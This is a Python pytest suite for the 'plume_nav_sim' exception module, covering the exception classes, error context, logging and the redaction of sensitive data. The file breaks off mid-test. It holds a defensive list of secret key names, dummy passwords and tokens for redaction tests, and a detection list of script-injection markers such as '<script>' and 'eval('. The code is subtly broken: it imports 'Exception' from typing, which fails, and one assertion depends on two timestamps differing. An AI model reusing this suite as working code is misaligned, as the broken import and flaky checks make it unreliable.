"""
Comprehensive test suite for plume_nav_sim exception handling module validating custom exception hierarchy, 
error handling functions, logging integration, security features, and recovery mechanisms.

This module provides complete coverage of:
- All exception classes and their inheritance hierarchy
- Error handling functions and centralized error management
- Logging integration and structured error reporting
- Security features and information disclosure prevention
- Performance characteristics and resource optimization
- Cross-component integration and error workflows

Test data is generated programmatically using controlled parameters and mock objects to ensure consistency
across different execution environments and maintain test isolation.
"""

# External imports with version comments
import pytest  # >=8.0.0 - Primary testing framework for comprehensive exception testing
import unittest.mock  # >=3.10 - Mocking utilities for isolating exception components
import logging  # >=3.10 - Logging module for testing exception logging integration
import time  # >=3.10 - Time utilities for testing timestamp generation and performance context
import threading  # >=3.10 - Threading utilities for testing thread-safe error handling
import traceback  # >=3.10 - Traceback utilities for testing stack trace formatting
import inspect  # >=3.10 - Inspect module for testing frame inspection and error context extraction
import tempfile  # >=3.10 - Temporary file operations for testing file-related error scenarios
import json  # >=3.10 - JSON operations for testing error context serialization
import re  # >=3.10 - Regular expressions for validating error message formats and security filtering
from typing import Dict, List, Any, Optional, Callable, Exception as ExceptionType

# Internal imports
from plume_nav_sim.utils.exceptions import (
    PlumeNavSimError,
    ValidationError,
    StateError,
    RenderingError,
    ConfigurationError,
    ComponentError,
    ResourceError,
    IntegrationError,
    ErrorSeverity,
    ErrorContext,
    handle_component_error,
    sanitize_error_context,
    format_error_details,
    create_error_context,
    log_exception_with_recovery
)

# Global test constants
TEST_COMPONENT_NAMES = ['environment', 'plume_model', 'renderer', 'state_manager', 'action_processor']
TEST_ERROR_MESSAGES = ['invalid input provided', 'bounds exceeded', 'validation failed', 'component failure']
TEST_RECOVERY_SUGGESTIONS = ['reset environment', 'fallback to rgb_array', 'clear cache', 'reinitialize component']
SENSITIVE_CONTEXT_KEYS = ['password', 'token', 'secret', 'internal_debug', 'stack_trace', 'private_key']
SAFE_CONTEXT_KEYS = ['component_name', 'operation_name', 'timestamp', 'error_count', 'action_type']
TEST_SEVERITY_LEVELS = [ErrorSeverity.LOW, ErrorSeverity.MEDIUM, ErrorSeverity.HIGH, ErrorSeverity.CRITICAL]
INVALID_PARAMETER_VALUES = ['invalid_string', -1, [], {}, None, 3.14159]
MOCK_SYSTEM_INFO = {'python_version': '3.10.0', 'platform': 'linux', 'thread_id': '12345'}
ERROR_MESSAGE_PATTERNS = [r'validation failed.*', r'invalid.*input', r'component.*failure', r'bounds.*exceeded']
PERFORMANCE_THRESHOLDS = {'error_handling_ms': 1.0, 'context_creation_ms': 0.5, 'sanitization_ms': 0.2}

# Module exports for test discovery
__all__ = [
    'TestPlumeNavSimError', 'TestValidationError', 'TestStateError', 'TestRenderingError',
    'TestConfigurationError', 'TestComponentError', 'TestResourceError', 'TestIntegrationError',
    'TestErrorSeverity', 'TestErrorContext', 'TestErrorHandlingFunctions', 'TestExceptionHierarchy',
    'TestErrorSecurity', 'TestErrorLogging', 'TestErrorPerformance', 'TestErrorIntegration',
    'create_test_error_context', 'create_mock_logger', 'generate_test_exceptions',
    'assert_exception_hierarchy', 'measure_exception_performance', 'validate_error_message_security'
]


def create_test_error_context(component_name: str, operation_name: str, include_caller_info: bool = True, include_sensitive_data: bool = False) -> ErrorContext:
    """Factory function to create ErrorContext instances with configurable parameters for comprehensive 
    exception testing scenarios and edge case validation.
    
    Args:
        component_name (str): Name of component for error context
        operation_name (str): Operation being performed during error
        include_caller_info (bool): Whether to include caller frame information
        include_sensitive_data (bool): Whether to include sensitive test data for security testing
        
    Returns:
        ErrorContext: Configured ErrorContext instance for testing exception functionality
    """
    # Create ErrorContext with component_name and operation_name
    context = ErrorContext(
        component_name=component_name,
        operation_name=operation_name,
        timestamp=time.time()
    )
    
    # Add caller information if include_caller_info is True
    if include_caller_info:
        context.add_caller_info(stack_depth=2)
    
    # Add system information for comprehensive context
    context.add_system_info()
    
    # Include sensitive test data if include_sensitive_data is True for security testing
    if include_sensitive_data:
        context.additional_data.update({
            'password': 'test_password_123',
            'token': 'secret_api_token',
            'internal_debug': 'sensitive_debug_info',
            'safe_info': 'public_information'
        })
    
    # Return configured ErrorContext ready for exception testing
    return context


def create_mock_logger(logger_name: str = 'test_logger', log_level: int = logging.DEBUG) -> unittest.mock.Mock:
    """Creates mock logger instance for testing exception logging behavior without affecting actual 
    logging system during test execution.
    
    Args:
        logger_name (str): Name for the mock logger
        log_level (int): Logging level for the mock logger
        
    Returns:
        unittest.mock.Mock: Mock logger configured for exception logging testing
    """
    # Create Mock object with logging interface methods
    mock_logger = unittest.mock.Mock()
    
    # Configure mock methods (debug, info, warning, error, critical)
    mock_logger.debug = unittest.mock.Mock()
    mock_logger.info = unittest.mock.Mock()
    mock_logger.warning = unittest.mock.Mock()
    mock_logger.error = unittest.mock.Mock()
    mock_logger.critical = unittest.mock.Mock()
    
    # Set logger name and level for realistic behavior
    mock_logger.name = logger_name
    mock_logger.level = log_level
    
    # Add call tracking for assertion validation
    mock_logger.reset_mock = unittest.mock.Mock()
    
    # Return configured mock logger for testing
    return mock_logger


def generate_test_exceptions(include_context: bool = True, include_sensitive_data: bool = False, exception_count: int = 5) -> List[PlumeNavSimError]:
    """Generates various exception instances for testing exception handling, serialization, and error 
    reporting across different exception types and severity levels.
    
    Args:
        include_context (bool): Whether to include error context in exceptions
        include_sensitive_data (bool): Whether to include sensitive data for security testing
        exception_count (int): Number of exception variations to generate
        
    Returns:
        List[PlumeNavSimError]: List of configured exception instances for comprehensive testing
    """
    exceptions = []
    
    # Create instances of each exception type from exception hierarchy
    exception_classes = [
        (ValidationError, 'parameter_name', 'invalid_value', 'expected_format'),
        (StateError, 'current_state', 'expected_state', 'component_name'),
        (RenderingError, 'render_mode', 'backend_name', None),
        (ConfigurationError, 'config_parameter', 'invalid_value', {}),
        (ComponentError, 'component_name', 'operation_name', None),
        (ResourceError, 'memory', 100.0, 50.0),
        (IntegrationError, 'numpy', '>=1.24.0', '1.20.0')
    ]
    
    for i, (exc_class, *args) in enumerate(exception_classes[:exception_count]):
        # Configure exceptions with test messages and severity levels
        message = TEST_ERROR_MESSAGES[i % len(TEST_ERROR_MESSAGES)]
        
        if exc_class == ValidationError:
            exception = ValidationError(message, args[0], args[1], args[2])
        elif exc_class == StateError:
            exception = StateError(message, args[0], args[1], args[2])
        elif exc_class == RenderingError:
            exception = RenderingError(message, args[0], args[1], args[2])
        elif exc_class == ConfigurationError:
            exception = ConfigurationError(message, args[0], args[1], args[2])
        elif exc_class == ComponentError:
            exception = ComponentError(message, args[0], args[1], args[2])
        elif exc_class == ResourceError:
            exception = ResourceError(message, args[0], args[1], args[2])
        elif exc_class == IntegrationError:
            exception = IntegrationError(message, args[0], args[1], args[2])
        else:
            exception = PlumeNavSimError(message)
        
        # Add error context if include_context is True
        if include_context:
            context = create_test_error_context(
                f'test_component_{i}',
                f'test_operation_{i}',
                include_sensitive_data=include_sensitive_data
            )
            exception.context = context
        
        exceptions.append(exception)
    
    # Return comprehensive list of test exceptions
    return exceptions


def assert_exception_hierarchy(exception_instance: ExceptionType, expected_base_class: type, required_methods: List[str]) -> None:
    """Comprehensive assertion helper for validating exception inheritance hierarchy, base class 
    functionality, and consistent exception interface implementation.
    
    Args:
        exception_instance (Exception): Exception instance to validate
        expected_base_class (type): Expected base class for inheritance validation
        required_methods (List[str]): List of required methods that must be implemented
    """
    # Assert exception_instance inherits from expected_base_class
    assert isinstance(exception_instance, expected_base_class), f"Exception {exception_instance} does not inherit from {expected_base_class}"
    
    # Verify exception implements required_methods interface
    for method_name in required_methods:
        assert hasattr(exception_instance, method_name), f"Exception {exception_instance} missing required method: {method_name}"
        method = getattr(exception_instance, method_name)
        assert callable(method), f"Method {method_name} is not callable"
    
    # Check exception has proper error details and context
    if hasattr(exception_instance, 'get_error_details'):
        details = exception_instance.get_error_details()
        assert isinstance(details, dict), "get_error_details should return a dictionary"
        assert 'error_id' in details, "Error details should include error_id"
        assert 'message' in details, "Error details should include message"
        assert 'timestamp' in details, "Error details should include timestamp"
    
    # Validate exception string representation and serialization
    str_repr = str(exception_instance)
    assert len(str_repr) > 0, "Exception string representation should not be empty"
    
    # Verify exception maintains consistency with base class interface
    if isinstance(exception_instance, PlumeNavSimError):
        assert hasattr(exception_instance, 'severity'), "PlumeNavSimError should have severity attribute"
        assert hasattr(exception_instance, 'error_id'), "PlumeNavSimError should have error_id attribute"
        assert hasattr(exception_instance, 'timestamp'), "PlumeNavSimError should have timestamp attribute"


def measure_exception_performance(exception_function: Callable, test_parameters: List[Any], iterations: int = 1000) -> Dict[str, Any]:
    """Performance measurement utility for exception handling operations testing creation time, memory 
    usage, and error processing efficiency with statistical analysis.
    
    Args:
        exception_function (Callable): Function to measure performance for
        test_parameters (List[Any]): Parameters to pass to the function
        iterations (int): Number of iterations for statistical measurement
        
    Returns:
        Dict[str, Any]: Performance metrics including timing statistics and resource usage analysis
    """
    import statistics
    
    # Initialize timing and memory measurement infrastructure
    execution_times = []
    
    # Execute exception_function with test_parameters for specified iterations
    for _ in range(iterations):
        start_time = time.perf_counter()
        try:
            exception_function(*test_parameters)
        except Exception:
            pass  # Expected for exception testing
        end_time = time.perf_counter()
        execution_times.append(end_time - start_time)
    
    # Calculate statistical metrics (mean, std, min, max, percentiles)
    mean_time = statistics.mean(execution_times)
    std_dev = statistics.stdev(execution_times) if len(execution_times) > 1 else 0.0
    min_time = min(execution_times)
    max_time = max(execution_times)
    median_time = statistics.median(execution_times)
    
    # Calculate percentiles
    sorted_times = sorted(execution_times)
    p95_time = sorted_times[int(0.95 * len(sorted_times))]
    p99_time = sorted_times[int(0.99 * len(sorted_times))]
    
    # Compare against performance thresholds from PERFORMANCE_THRESHOLDS
    performance_analysis = {
        'mean_ms': mean_time * 1000,
        'std_dev_ms': std_dev * 1000,
        'min_ms': min_time * 1000,
        'max_ms': max_time * 1000,
        'median_ms': median_time * 1000,
        'p95_ms': p95_time * 1000,
        'p99_ms': p99_time * 1000,
        'iterations': iterations,
        'meets_error_handling_threshold': mean_time * 1000 < PERFORMANCE_THRESHOLDS['error_handling_ms'],
        'meets_context_creation_threshold': mean_time * 1000 < PERFORMANCE_THRESHOLDS['context_creation_ms'],
        'bottleneck_identified': max_time > mean_time * 3  # Identify outliers
    }
    
    # Return comprehensive performance metrics for test assertions
    return performance_analysis


def validate_error_message_security(error_message: str, error_context: Dict[str, Any], strict_mode: bool = True) -> bool:
    """Security validation helper for testing error messages ensure no sensitive information disclosure, 
    proper sanitization, and secure formatting across all exception types.
    
    Args:
        error_message (str): Error message to validate for security
        error_context (Dict[str, Any]): Error context to check for sensitive information
        strict_mode (bool): Whether to apply strict security validation rules
        
    Returns:
        bool: True if error message passes security validation, False otherwise
    """
    # Check error message does not contain sensitive terms from SENSITIVE_CONTEXT_KEYS
    message_lower = error_message.lower()
    for sensitive_key in SENSITIVE_CONTEXT_KEYS:
        if sensitive_key.lower() in message_lower:
            return False
    
    # Verify error message excludes internal debugging information
    debug_terms = ['traceback', 'stack trace', 'internal_debug', 'debug_info']
    for debug_term in debug_terms:
        if debug_term.lower() in message_lower:
            return False
    
    # Validate error context sanitization removed sensitive information
    if error_context:
        for key, value in error_context.items():
            key_lower = str(key).lower()
            value_str = str(value).lower()
            
            # Check for sensitive keys in context
            for sensitive_key in SENSITIVE_CONTEXT_KEYS:
                if sensitive_key.lower() in key_lower or sensitive_key.lower() in value_str:
                    # Should be sanitized placeholder
                    if '<sanitized>' not in value_str and strict_mode:
                        return False
    
    # Check error message format prevents injection vulnerabilities
    dangerous_patterns = ['<script>', 'javascript:', 'eval(', 'exec(']
    for pattern in dangerous_patterns:
        if pattern.lower() in message_lower:
            return False
    
    # Assert error message provides useful guidance without disclosure
    if strict_mode:
        # Message should not be too revealing about internal structure
        internal_terms = ['file path', 'class name', 'method name', 'variable name']
        for term in internal_terms:
            if term.lower() in message_lower:
                return False
    
    # Return security validation result for test assertions
    return True


class TestPlumeNavSimError:
    """Test suite for PlumeNavSimError base exception class validating initialization, error details 
    formatting, logging integration, and common exception functionality across all derived exceptions."""
    
    def setup_method(self):
        """Set up test fixtures for PlumeNavSimError base class testing."""
        # Initialize PlumeNavSimError instance with test message and context
        self.test_message = "Test error message for base exception"
        self.test_context = create_test_error_context('test_component', 'test_operation')
        self.base_error = PlumeNavSimError(self.test_message, self.test_context, ErrorSeverity.MEDIUM)
        
        # Set up mock_logger for logging integration testing
        self.mock_logger = create_mock_logger('plume_nav_sim.test')
    
    def test_base_error_initialization(self):
        """Test PlumeNavSimError initialization with various parameter combinations ensuring proper 
        setup of message, context, and severity."""
        # Create PlumeNavSimError with message only
        simple_error = PlumeNavSimError("Simple error message")
        assert simple_error.message == "Simple error message"
        assert simple_error.severity == ErrorSeverity.MEDIUM  # Default severity
        assert simple_error.context is None
        assert simple_error.error_id is not None
        assert simple_error.timestamp > 0
        assert simple_error.recovery_suggestion is None
        assert simple_error.logged is False
        
        # Test initialization with message, context, and severity parameters
        full_error = PlumeNavSimError("Full error", self.test_context, ErrorSeverity.HIGH)
        assert full_error.message == "Full error"
        assert full_error.context == self.test_context
        assert full_error.severity == ErrorSeverity.HIGH
        
        # Verify error ID generation and timestamp creation are unique
        another_error = PlumeNavSimError("Another error")
        assert simple_error.error_id != another_error.error_id
        assert simple_error.timestamp != another_error.timestamp
        
        # Test edge cases with empty message and None context
        edge_error = PlumeNavSimError("")
        assert edge_error.message == ""
        assert edge_error.context is None
    
    def test_get_error_details_method(self):
        """Test PlumeNavSimError.get_error_details method ensuring comprehensive error information 
        including context, timestamp, and recovery data."""
        # Call get_error_details and examine dictionary structure
        details = self.base_error.get_error_details()
        
        # Assert details contain message, error_id, timestamp, and severity
        assert isinstance(details, dict)
        assert details['message'] == self.test_message
        assert details['error_id'] == self.base_error.error_id
        assert details['timestamp'] == self.base_error.timestamp
        assert details['severity'] == ErrorSeverity.MEDIUM.name
        assert details['severity_description'] == ErrorSeverity.MEDIUM.get_description()
        assert details['exception_type'] == 'PlumeNavSimError'
        
        # Verify context information is properly formatted and included
        assert 'context' in details
        context_dict = details['context']
        assert context_dict['component_name'] == 'test_component'
        assert context_dict['operation_name'] == 'test_operation'
        
        # Test error details are JSON-serializable for external use
        json_str = json.dumps(details, default=str)
        assert len(json_str) > 0
        
        # Test with recovery suggestion
        self.base_error.set_recovery_suggestion("Try restarting the component")
        details_with_recovery = self.base_error.get_error_details()
        assert details_with_recovery['recovery_suggestion'] == "Try restarting the component"
    
    def test_format_for_user_method(self):
        """Test PlumeNavSimError.format_for_user method ensuring user-friendly error messages without 
        sensitive information disclosure."""
        # Set recovery suggestion for testing
        self.base_error.set_recovery_suggestion("Contact system administrator")
        
        # Call format_for_user with include_suggestions=True
        user_message_with_suggestions = self.base_error.format_for_user(include_suggestions=True)
        assert self.test_message in user_message_with_suggestions
        assert "Contact system administrator" in user_message_with_suggestions
        
        # Test with include_suggestions=False excludes recovery information
        user_message_no_suggestions = self.base_error.format_for_user(include_suggestions=False)
        assert self.test_message in user_message_no_suggestions
        assert "Contact system administrator" not in user_message_no_suggestions
        
        # Test formatting with sensitive information removal
        sensitive_error = PlumeNavSimError("Error with password: test123 and token data")
        safe_message = sensitive_error.format_for_user()
        assert "password" not in safe_message.lower()
        assert "token" not in safe_message.lower()
        assert "<sanitized>" in safe_message
        
        # Test technical error message transformation
        technical_error = PlumeNavSimError("Traceback: Exception in module.function")
        user_friendly = technical_error.format_for_user()
        assert "An error occurred in the plume navigation environment" in user_friendly
    
    def test_log_error_method(self):
        """Test PlumeNavSimError.log_error method ensuring proper logging integration with appropriate 
        levels and context information."""
        # Call log_error with mock logger and verify logging behavior
        self.base_error.log_error(self.mock_logger, include_stack_trace=False)
        
        # Assert logging level matches error severity appropriately (MEDIUM = warning)
        self.mock_logger.warning.assert_called_once()
        
        # Verify log message includes sanitized error context
        call_args = self.mock_logger.warning.call_args[0][0]
        assert self.base_error.error_id in call_args
        assert self.test_message in call_args
        assert "test_component.test_operation" in call_args
        
        # Test logging marks error as logged to prevent duplicates
        assert self.base_error.logged is True
        
        # Test duplicate logging prevention
        self.mock_logger.reset_mock()
        self.base_error.log_error(self.mock_logger)
        self.mock_logger.warning.assert_not_called()
        
        # Test different severity levels
        critical_error = PlumeNavSimError("Critical error", severity=ErrorSeverity.CRITICAL)
        critical_error.log_error(self.mock_logger)
        self.mock_logger.critical.assert_called_once()
        
        low_error = PlumeNavSimError("Low priority error", severity=ErrorSeverity.LOW)
        low_error.log_error(self.mock_logger)
        self.mock_logger.info.assert_called_once()
    
    def test_set_recovery_suggestion_method(self):
        """Test PlumeNavSimError.set_recovery_suggestion method for setting automated error handling 
        guidance and user recovery instructions."""
        # Call set_recovery_suggestion with valid suggestion text
        suggestion = "Reset the environment and try again"
        self.base_error.set_recovery_suggestion(suggestion)
        
        # Assert recovery_suggestion is stored correctly
        assert self.base_error.recovery_suggestion == suggestion
        
        # Verify error_details updated with recovery information
        assert self.base_error.error_details['has_recovery_guidance'] is True
        
        # Test suggestion length validation against maximum limits
        long_suggestion = "x" * 600  # Exceeds RECOVERY_SUGGESTION_MAX_LENGTH (500)
        self.base_error.set_recovery_suggestion(long_suggestion)
        assert len(self.base_error.recovery_suggestion) <= 500
        assert self.base_error.recovery_suggestion.endswith("...")
        
        # Test with empty suggestions
        self.base_error.set_recovery_suggestion("")
        assert self.base_error.recovery_suggestion == ""
    
    def test_add_context_method(self):
        """Test PlumeNavSimError.add_context method for adding additional debugging information while 
        maintaining security sanitization."""
        # Call add_context with various key-value pairs
        self.base_error.add_context("operation_step", "validation")
        self.base_error.add_context("retry_count", 3)
        self.base_error.add_context("safe_info", "public_data")
        
        # Assert context information is added to error_details
        assert self.base_error.error_details["operation_step"] == "validation"
        assert self.base_error.error_details["retry_count"] == 3
        assert self.base_error.error_details["safe_info"] == "public_data"
        
        # Test context value sanitization for sensitive information
        self.base_error.add_context("sensitive_key", "password: secret123")
        assert self.base_error.error_details["sensitive_key"] == "<sanitized>"
        
        # Test invalid key handling
        with pytest.raises(ValueError, match="Context key must be a non-empty string"):
            self.base_error.add_context("", "value")
        
        with pytest.raises(ValueError, match="Context key must be a non-empty string"):
            self.base_error.add_context(None, "value")


class TestValidationError:
    """Test suite for ValidationError exception class validating input parameter validation failure 
    handling, validation details, and parameter-specific error reporting."""
    
    def setup_method(self):
        """Set up test fixtures for ValidationError class testing."""
        # Initialize ValidationError with test parameter validation scenario
        self.test_parameter_name = "grid_size"
        self.test_invalid_value = "invalid_grid_size"
        self.test_expected_format = "(width, height) tuple with positive integers"
        self.validation_error = ValidationError(
            "Grid size validation failed",
            self.test_parameter_name,
            self.test_invalid_value,
            self.test_expected_format
        )
    
    def test_validation_error_initialization(self):
        """Test ValidationError initialization with parameter details including parameter name, 
        invalid value, and expected format information."""
        # Assert error inherits from PlumeNavSimError with MEDIUM severity
        assert isinstance(self.validation_error, PlumeNavSimError)
        assert self.validation_error.severity == ErrorSeverity.MEDIUM
        
        # Verify parameter_name, invalid_value, and expected_format storage
        assert self.validation_error.parameter_name == self.test_parameter_name
        assert self.validation_error.invalid_value == self.test_invalid_value
        assert self.validation_error.expected_format == self.test_expected_format
        
        # Check validation_errors list and parameter_constraints initialization
        assert isinstance(self.validation_error.validation_errors, list)
        assert len(self.validation_error.validation_errors) == 0
        assert isinstance(self.validation_error.parameter_constraints, dict)
        
        # Assert default recovery suggestion for validation failures
        assert self.validation_error.recovery_suggestion is not None
        assert "input parameters" in self.validation_error.recovery_suggestion.lower()
        
        # Test edge cases with None parameter_name and complex invalid values
        edge_error = ValidationError("Validation failed", None, {'complex': 'value'}, None)
        assert edge_error.parameter_name is None
        assert edge_error.invalid_value == {'complex': 'value'}
    
    def test_get_validation_details_method(self):
        """Test ValidationError.get_validation_details method ensuring comprehensive validation error 
        information with parameter constraints and error context."""
        # Call get_validation_details and examine validation-specific information
        details = self.validation_error.get_validation_details()
        
        # Assert details include parameter_name, expected_format, and invalid_value
        assert details['parameter_name'] == self.test_parameter_name
        assert details['expected_format'] == self.test_expected_format
        assert details['invalid_value'] == self.test_invalid_value
        
        # Verify validation_errors list contains all validation failures
        assert 'validation_errors' in details
        assert isinstance(details['validation_errors'], list)
        
        # Check parameter_constraints dictionary includes validation rules
        assert 'parameter_constraints' in details
        assert isinstance(details['parameter_constraints'], dict)
        
        # Test validation details integration with base error details
        assert 'error_id' in details  # From base class
        assert 'message' in details  # From base class
        assert 'timestamp' in details  # From base class
    
    def test_add_validation_error_method(self):
        """Test ValidationError.add_validation_error method for accumulating multiple validation 
        failures in compound validation scenarios."""
        # Call add_validation_error with additional error message
        error_msg1 = "Width must be positive"
        self.validation_error.add_validation_error(error_msg1, "width")
        
        # Assert error message added to validation_errors list
        assert len(self.validation_error.validation_errors) == 1
        assert self.validation_error.validation_errors[0]['message'] == error_msg1
        assert self.validation_error.validation_errors[0]['field_name'] == "width"
        
        # Test with optional field_name parameter
        error_msg2 = "Height must be positive"
        self.validation_error.add_validation_error(error_msg2, "height")
        
        assert len(self.validation_error.validation_errors) == 2
        assert self.validation_error.validation_errors[1]['message'] == error_msg2
        assert self.validation_error.validation_errors[1]['field_name'] == "height"
        
        # Verify recovery suggestion updated for multiple validation errors
        assert "multiple validation errors" in self.validation_error.recovery_suggestion.lower()
        
        # Test edge cases with empty error messages
        with pytest.raises(ValueError, match="Error message must be a non-empty string"):
            self.validation_error.add_validation_error("", "field")
    
    def test_set_parameter_constraints_method(self):
        """Test ValidationError.set_parameter_constraints method for setting validation rules and 
        constraint information for detailed error reporting."""
        # Call set_parameter_constraints with constraints dictionary
        constraints = {
            'min_width': 1,
            'max_width': 1000,
            'min_height': 1,
            'max_height': 1000,
            'type': 'tuple'
        }
        self.validation_error.set_parameter_constraints(constraints)
        
        # Assert constraints stored in parameter_constraints field
        assert self.validation_error.parameter_constraints == constraints
        
        # Verify recovery suggestion generation based on constraints
        recovery_suggestion = self.validation_error.recovery_suggestion
        assert "constraints" in recovery_suggestion.lower()
        for key, value in constraints.items():
            if isinstance(value, (str, int)):
                assert str(value) in recovery_suggestion
        
        # Test constraint validation and type checking
        with pytest.raises(TypeError, match="Constraints must be a dictionary"):
            self.validation_error.set_parameter_constraints("not_a_dict")
        
        # Test constraints with various parameter types
        complex_constraints = {
            'allowed_values': [1, 2, 3],
            'pattern': r'^[a-zA-Z]+$',
            'validation_function': lambda x: x > 0
        }
        self.validation_error.set_parameter_constraints(complex_constraints)
        assert self.validation_error.parameter_constraints == complex_constraints


class TestStateError:
    """Test suite for StateError exception class validating environment state transition errors, 
    recovery suggestions, and state analysis functionality."""
    
    def setup_method(self):
        """Set up test fixtures for StateError class testing."""
        # Initialize StateError with state transition failure scenario
        self.test_current_state = "uninitialized"
        self.test_expected_state = "ready"
        self.test_component_name = "environment"
        self.state_error = StateError(
            "Invalid state transition attempted",
            self.test_current_state,
            self.test_expected_state,
            self.test_component_name
        )
    
    def test_state_error_initialization(self):
        """Test StateError initialization with current state, expected state, and component information 
        for state transition analysis."""
        # Assert error inherits from PlumeNavSimError with HIGH severity
        assert isinstance(self.state_error, PlumeNavSimError)
        assert self.state_error.severity == ErrorSeverity.HIGH
        
        # Verify current_state, expected_state, and component_name storage
        assert self.state_error.current_state == self.test_current_state
        assert self.state_error.expected_state == self.test_expected_state
        assert self.state_error.component_name == self.test_component_name
        
        # Check state_details dictionary and state_transition_history initialization
        assert isinstance(self.state_error.state_details, dict)
        assert isinstance(self.state_error.state_transition_history, list)
        
        # Assert recovery suggestion based on state transition analysis
        assert self.state_error.recovery_suggestion is not None
        assert "initialize" in self.state_error.recovery_suggestion.lower()
    
    def test_suggest_recovery_action_method(self):
        """Test StateError.suggest_recovery_action method for providing specific recovery actions 
        based on state analysis and component type."""
        # Call suggest_recovery_action and examine recovery suggestion
        recovery_action = self.state_error.suggest_recovery_action()
        
        # Assert recovery action is appropriate for current_state and expected_state
        assert "initialize" in recovery_action.lower()
        
        # Test component-specific recovery strategies
        env_error = StateError("Environment error", "terminated", "active", "environment")
        env_recovery = env_error.suggest_recovery_action()
        assert "reset" in env_recovery.lower()
        
        plume_error = StateError("Plume error", "error", "ready", "plume_model")
        plume_recovery = plume_error.suggest_recovery_action()
        assert "reinitialize plume model" in plume_recovery.lower()
        
        render_error = StateError("Render error", "failed", "ready", "renderer")
        render_recovery = render_error.suggest_recovery_action()
        assert "rendering pipeline" in render_recovery.lower() or "fallback mode" in render_recovery.lower()
        
        # Test with various state combinations
        error_state_error = StateError("Component in error state", "error", "ready", "component")
        error_recovery = error_state_error.suggest_recovery_action()
        assert "clear error state" in error_recovery.lower()
    
    def test_add_state_details_method(self):
        """Test StateError.add_state_details method for adding detailed state information for 
        debugging and recovery analysis."""
        # Call add_state_details with state information dictionary
        state_details = {
            'episode_active': False,
            'step_count': 0,
            'last_action': None,
            'initialization_time': time.time(),
            'safe_info': 'public_state_info'
        }
        self.state_error.add_state_details(state_details)
        
        # Assert details sanitized and merged into state_details
        assert 'episode_active' in self.state_error.state_details
        assert 'step_count' in self.state_error.state_details
        assert 'safe_info' in self.state_error.state_details
        
        # Test state information integration with recovery suggestions
        if not state_details['episode_active']:
            recovery_suggestion = self.state_error.recovery_suggestion
            assert "reset" in recovery_suggestion.lower() or "episode" in recovery_suggestion.lower()
        
        # Test with invalid input
        with pytest.raises(TypeError, match="State details must be a dictionary"):
            self.state_error.add_state_details("not_a_dict")
        
        # Test state details with complex nested information
        complex_details = {
            'nested_state': {
                'sub_component': 'active',
                'sub_details': {'level': 2}
            },
            'state_history': [{'state': 'init'}, {'state': 'ready'}]
        }
        self.state_error.add_state_details(complex_details)
        assert 'nested_state' in self.state_error.state_details


class TestRenderingError:
    """Test suite for RenderingError exception class validating visualization failure handling, 
    backend compatibility analysis, and rendering fallback mechanisms."""
    
    def setup_method(self):
        """Set up test fixtures for RenderingError class testing."""
        # Initialize RenderingError with rendering failure scenario
        self.test_render_mode = "human"
        self.test_backend_name = "TkAgg"
        self.test_underlying_error = ImportError("No module named 'tkinter'")
        self.rendering_error = RenderingError(
            "Failed to initialize matplotlib backend",
            self.test_render_mode,
            self.test_backend_name,
            self.test_underlying_error
        )
    
    def test_rendering_error_initialization(self):
        """Test RenderingError initialization with render mode, backend information, and underlying 
        error details for rendering failure analysis."""
        # Assert error inherits from PlumeNavSimError with MEDIUM severity
        assert isinstance(self.rendering_error, PlumeNavSimError)
        assert self.rendering_error.severity == ErrorSeverity.MEDIUM
        
        # Verify render_mode, backend_name, and underlying_error storage
        assert self.rendering_error.render_mode == self.test_render_mode
        assert self.rendering_error.backend_name == self.test_backend_name
        assert self.rendering_error.underlying_error == self.test_underlying_error
        
        # Check available_fallbacks list and rendering_context initialization
        assert isinstance(self.rendering_error.available_fallbacks, list)
        assert isinstance(self.rendering_error.rendering_context, dict)
        
        # Assert recovery suggestion for rendering fallback options
        assert self.rendering_error.recovery_suggestion is not None
        recovery = self.rendering_error.recovery_suggestion.lower()
        assert "fallback" in recovery or "rgb_array" in recovery
    
    def test_get_fallback_suggestions_method(self):
        """Test RenderingError.get_fallback_suggestions method for providing available rendering 
        fallback options based on error context and system capabilities."""
        # Call get_fallback_suggestions and examine fallback options
        fallbacks = self.rendering_error.get_fallback_suggestions()
        
        # Assert fallback options appropriate for render_mode and backend_name
        assert isinstance(fallbacks, list)
        
        # Test 'rgb_array' fallback suggestion for failed 'human' mode
        if self.rendering_error.render_mode == 'human':
            assert 'rgb_array' in fallbacks
        
        # Verify 'Agg' backend fallback for matplotlib display issues
        if self.rendering_error.backend_name != 'Agg':
            assert 'Agg backend' in fallbacks
        
        # Test system capability analysis for alternative backends
        if self.rendering_error.backend_name in ['TkAgg', 'Qt5Agg']:
            backend_fallbacks = [f for f in fallbacks if 'backend' in f.lower()]
            assert len(backend_fallbacks) > 0
        
        # Test fallback suggestions with various rendering error scenarios
        rgb_error = RenderingError("RGB array failed", "rgb_array", "numpy", None)
        rgb_fallbacks = rgb_error.get_fallback_suggestions()
        assert len(rgb_fallbacks) >= 0  # May have different fallbacks for rgb_array mode
    
    def test_set_rendering_context_method(self):
        """Test RenderingError.set_rendering_context method for setting rendering context information 
        for detailed error analysis and debugging."""
        # Call set_rendering_context with rendering-specific information
        context = {
            'headless': True,
            'display_available': False,
            'matplotlib_version': '3.9.0',
            'available_backends': ['Agg'],
            'figure_size': (8, 8)
        }
        self.rendering_error.set_rendering_context(context)
        
        # Assert context stored in rendering_context dictionary
        assert self.rendering_error.rendering_context == context
        
        # Test context integration with available_fallbacks updates
        if context.get('headless'):
            fallbacks = self.rendering_error.get_fallback_suggestions()
            assert 'rgb_array' in fallbacks
            assert 'Agg backend' in fallbacks
        
        # Verify recovery suggestion updated based on context
        if context.get('headless'):
            recovery = self.rendering_error.recovery_suggestion
            assert "headless" in recovery.lower() or "rgb_array" in recovery.lower()
        
        # Test with invalid input
        with pytest.raises(TypeError, match="Rendering context must be a dictionary"):
            self.rendering_error.set_rendering_context("not_a_dict")


class TestConfigurationError:
    """Test suite for ConfigurationError exception class validating environment setup failures, 
    parameter validation, and configuration guidance."""
    
    def setup_method(self):
        """Set up test fixtures for ConfigurationError class testing."""
        # Initialize ConfigurationError with configuration failure scenario
        self.test_config_parameter = "render_mode"
        self.test_invalid_value = "invalid_mode"
        self.test_valid_options = {
            'render_mode': ['human', 'rgb_array'],
            'description': 'Rendering mode for visualization'
        }
        self.config_error = ConfigurationError(
            "Invalid render mode specified",
            self.test_config_parameter,
            self.test_invalid_value,
            self.test_valid_options
        )
    
    def test_configuration_error_initialization(self):
        """Test ConfigurationError initialization with configuration parameter details and valid 
        options for setup guidance."""
        # Assert error inherits from PlumeNavSimError with HIGH severity
        assert isinstance(self.config_error, PlumeNavSimError)
        assert self.config_error.severity == ErrorSeverity.HIGH
        
